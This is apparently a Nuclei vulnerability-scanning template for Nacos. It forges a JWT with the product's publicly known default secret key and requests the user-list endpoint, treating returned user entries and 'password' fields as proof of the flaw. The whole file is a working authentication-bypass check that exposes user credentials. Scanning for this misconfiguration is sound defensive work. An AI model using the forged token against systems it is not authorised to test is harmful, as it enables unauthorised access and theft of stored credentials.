id: poc-yaml-nacos-jwt-default-secretKey
info:
  name: Nacos Default Secret Key Misconfiguration Privilege Bypass
  author: ProjectDiscoveryAI
  severity: high
  tags: misconfiguration

variables:
  r_key: "{{hex_encode(base64_decode('SecretKey01234567890123456789012345678901234567890123456789012345678'))}}"
  r_token: "{{generate_jwt('{\"sub\":\"nacos\"}', 'HS256', hex_decode(r_key))}}"

http:
  - raw:
      - |
        GET /nacos/v1/auth/users?pageNo=1&pageSize=10&search=accurate HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        accessToken: {{r_token}}

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "json"
      - type: word
        part: body
        words:
          - "pageItems"
          - "password"
      - type: word
        part: body
        words:
          - "<"
        negative: true
